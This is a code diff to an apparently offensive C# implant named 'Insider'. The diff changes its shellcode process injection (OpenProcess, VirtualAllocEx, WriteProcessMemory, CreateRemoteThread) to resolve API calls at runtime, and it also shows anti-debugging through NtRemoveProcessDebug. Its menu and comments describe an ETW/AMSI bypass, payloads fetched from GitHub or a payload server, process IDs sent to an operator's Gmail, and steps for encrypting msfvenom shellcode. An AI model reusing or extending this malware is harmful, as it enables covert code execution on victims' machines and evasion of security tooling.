@@ -16,12 +16,20 @@ namespace Insider
         // ========================= Thread Process(shellcode) Injection: Flags and Functions =====================
 
         // ==============================
-
-        //getmodulehandle: https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulehandlea
+        /*
+        // link: https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulehandlea
+        // Retrieves a module handle for the specified module. The module must have been loaded by the calling process.
         [DllImport("kernel32.dll")]
         public static extern IntPtr GetModuleHandleA(
         string module
         );
+        */
+
+        // link: https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya
+        // Loads the specified module into the address space of the calling process.
+        // The specified module may cause other modules to be loaded.
+        [DllImport("kernel32.dll")]
+        public static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)] string lpFileName);
 
         //getprocaddress: https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress
         [DllImport("kernel32.dll")]
@@ -470,6 +478,10 @@ namespace Insider
             {
                 if(arg.Equals("1.1"))
                 {
+                    string url1 = "";
+                    string url2 = "";
+                    string url3 = "";
+
                     CheckDebugger();
 
                     // Loading Assembly no 1: ETW and AMSI patch
@@ -639,6 +651,7 @@ namespace Insider
             {
 
                 string url4 = "";
+                string kernel = "Kernel32";
 
                 CheckDebugger();
 
@@ -647,13 +660,13 @@ namespace Insider
                     // mssgbox_x64
                     // mssgbox_x64: Encrypted
 
-		    // Creating .bin file and Extracting shellcode from .bin file:
-		    // Creating: https://ivanitlearning.wordpress.com/2018/10/14/shellcoding-with-msfvenom/
+		            // Creating .bin file and Extracting shellcode from .bin file:
+		            // Creating: https://ivanitlearning.wordpress.com/2018/10/14/shellcoding-with-msfvenom/
                     // Extract: 
-		    // cmd: ".\encrypt.exe /file:file.bin /out:aes_xor_b64"
-		    // paste the output b64 bytes into a .txt file and upload it to payload server.
-		    // cmd: "mv .\obfuscator\"
-		    // cmd: ".\encrypt.exe /shellcodeurl:<url-to-payloadserver-mssgbox_box.txt> /out:aes_xor_b64"
+		            // cmd: ".\encrypt.exe /file:file.bin /out:aes_xor_b64"
+		            // paste the output b64 bytes into a .txt file and upload it to payload server.
+		            // cmd: "mv .\obfuscator\"
+		            // cmd: ".\encrypt.exe /shellcodeurl:<url-to-payloadserver-mssgbox_box.txt> /out:aes_xor_b64"
                     string encryptedurl4 = "See the above instruction";	// Change it
 
                     Console.WriteLine("\n================DROPPER==================");
@@ -705,7 +718,9 @@ namespace Insider
                 //IntPtr rphandle = OpenProcess(0x1F0FFF, false, Convert.ToUInt32(Program.pid));
 
                 // delegates
-                IntPtr funcaddr1 = GetProcAddress(GetModuleHandleA("Kernel32.dll"), "OpenProcess");
+                //IntPtr funcaddr1 = GetProcAddress(GetModuleHandleA("Kernel32.dll"), "OpenProcess");
+
+                IntPtr funcaddr1 = GetProcAddress(LoadLibrary(kernel), "OpenProcess");
                 oprocess op = (oprocess)Marshal.GetDelegateForFunctionPointer(funcaddr1, typeof(oprocess));
                 IntPtr rphandle = op(0x1F0FFF, false, Convert.ToUInt32(Program.pid));
 
@@ -716,7 +731,9 @@ namespace Insider
                 //IntPtr createdBuffer = VirtualAllocEx(rphandle, IntPtr.Zero, (uint)shellcode.Length, (uint)AllocationType.MEM_COMMIT | (uint)AllocationType.MEM_RESERVE, (uint)MemoryProtection.PAGE_EXECUTE_READWRITE);
 
                 // delegates
-                IntPtr funcaddr2 = GetProcAddress(GetModuleHandleA("Kernel32.dll"), "VirtualAllocEx");
+                //IntPtr funcaddr2 = GetProcAddress(GetModuleHandleA("Kernel32.dll"), "VirtualAllocEx");
+
+                IntPtr funcaddr2 = GetProcAddress(LoadLibrary(kernel), "VirtualAllocEx");
                 vallocx vax = (vallocx)Marshal.GetDelegateForFunctionPointer(funcaddr2, typeof(vallocx));
                 IntPtr createdBuffer = vax(rphandle, IntPtr.Zero, (UInt32)shellcode.Length, (UInt32)AllocationType.MEM_COMMIT | (UInt32)AllocationType.MEM_RESERVE, (UInt32)MemoryProtection.PAGE_EXECUTE_READWRITE);
                 
@@ -733,7 +750,9 @@ namespace Insider
                 //WriteProcessMemory(rphandle, createdBuffer, shellcode, shellcode.Length, out bytesWritten);
 
                 // delegate
-                IntPtr funcaddr3 = GetProcAddress(GetModuleHandleA("Kernel32.dll"), "WriteProcessMemory");
+                //IntPtr funcaddr3 = GetProcAddress(GetModuleHandleA("Kernel32.dll"), "WriteProcessMemory");
+
+                IntPtr funcaddr3 = GetProcAddress(LoadLibrary(kernel), "WriteProcessMemory");
                 WPMemory wpmemory = (WPMemory)Marshal.GetDelegateForFunctionPointer(funcaddr3, typeof(WPMemory));
                 wpmemory(rphandle, createdBuffer, shellcode, Convert.ToInt32(shellcode.Length), out bytesWritten);
 
@@ -745,7 +764,9 @@ namespace Insider
                 //bool check = VirtualProtectEx(rphandle, createdBuffer, (UIntPtr) shellcode.Length, 0x40,  /* PAGE_EXECUTE_READ_WRITE */ out uint _);
 
                 // delegate
-                IntPtr funcaddr4 = GetProcAddress(GetModuleHandleA("Kernel32.dll"), "VirtualProtectEx");
+                //IntPtr funcaddr4 = GetProcAddress(GetModuleHandleA("Kernel32.dll"), "VirtualProtectEx");
+
+                IntPtr funcaddr4 = GetProcAddress(LoadLibrary(kernel), "VirtualProtectEx");
                 VPEx vpex = (VPEx)Marshal.GetDelegateForFunctionPointer(funcaddr4, typeof(VPEx));
                 bool check = vpex(rphandle, createdBuffer, (UIntPtr) shellcode.Length, 0x40,  /* PAGE_EXECUTE_READ_WRITE */ out uint _);
 
@@ -763,9 +784,10 @@ namespace Insider
                 //hThread = CreateRemoteThread(rphandle, IntPtr.Zero, 0, createdBuffer, IntPtr.Zero, 0, IntPtr.Zero);
 
                 // delegate
-                IntPtr funcaddr5 = GetProcAddress(GetModuleHandleA("Kernel32.dll"), "CreateRemoteThread");
-                CRThread crthread = (CRThread)Marshal.GetDelegateForFunctionPointer(funcaddr5, typeof(CRThread));
+                //IntPtr funcaddr5 = GetProcAddress(GetModuleHandleA("Kernel32.dll"), "CreateRemoteThread");
 
+                IntPtr funcaddr5 = GetProcAddress(LoadLibrary(kernel), "CreateRemoteThread");
+                CRThread crthread = (CRThread)Marshal.GetDelegateForFunctionPointer(funcaddr5, typeof(CRThread));
                 hThread = crthread(rphandle, IntPtr.Zero, 0, createdBuffer, IntPtr.Zero, 0, IntPtr.Zero);
                 
                 Console.WriteLine("[+] CreateRemoteThread() is called");
@@ -777,7 +799,9 @@ namespace Insider
                     //WaitForSingleObject(hThread, 0xFFFFFFFF);
 
                     // delegate
-                    IntPtr funcaddr6 = GetProcAddress(GetModuleHandleA("Kernel32.dll"), "WaitForSingleObject");
+                    //IntPtr funcaddr6 = GetProcAddress(GetModuleHandleA("Kernel32.dll"), "WaitForSingleObject");
+
+                    IntPtr funcaddr6 = GetProcAddress(LoadLibrary(kernel), "WaitForSingleObject");
                     WFSO wfso = (WFSO)Marshal.GetDelegateForFunctionPointer(funcaddr6, typeof(WFSO));
 
                     wfso(hThread, 0xFFFFFFFF);
@@ -800,7 +824,7 @@ namespace Insider
                 Console.WriteLine("\n");
                 Console.Write(@"[*] Choose serial number [1-4]: 
 1. Loader
-    1.1: Loader: Bypass ETW and AMSI => Fetches .NET payload from github.
+    1.1: Loader: Bypass ETW and AMSI => Fetches .NET payloads from github/remote payload server.
                  Send Process Ids to Operator's gmail, From where Operator can pick a pid and add that to github
                  Implant will read from github to perform Process Injection 
     1.2: Loader: Use Custom payload via external url
@@ -870,6 +894,7 @@ namespace Insider
 
                 // ProcessBasicInformation: In processInformationClass, https://docs.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntqueryinformationprocess
 
+                string ntdll = "ntdll";
                 IntPtr phandle = Process.GetCurrentProcess().Handle;
 
                 // http://www.pinvoke.net/default.aspx/ntdll/NtQueryInformationProcess.html
@@ -963,7 +988,9 @@ namespace Insider
                     */
 
                     // delegate
-                    IntPtr funcaddr8 = GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
+                    //IntPtr funcaddr8 = GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
+
+                    IntPtr funcaddr8 = GetProcAddress(LoadLibrary(ntdll), "NtQueryInformationProcess");
                     NtQIP2 ntqip2 = (NtQIP2)Marshal.GetDelegateForFunctionPointer(funcaddr8, typeof(NtQIP2));
 
                     ntqip2(
@@ -983,7 +1010,9 @@ namespace Insider
                     //int status = NtRemoveProcessDebug(phandle, debuggerhandle);
 
                     // delegate
-                    IntPtr funcaddr9 = GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtRemoveProcessDebug");
+                    //IntPtr funcaddr9 = GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtRemoveProcessDebug");
+
+                    IntPtr funcaddr9 = GetProcAddress(LoadLibrary(ntdll), "NtRemoveProcessDebug");
                     NtRPD ntrpd = (NtRPD)Marshal.GetDelegateForFunctionPointer(funcaddr9, typeof(NtRPD));
 
                     int status = ntrpd(phandle, debuggerhandle);
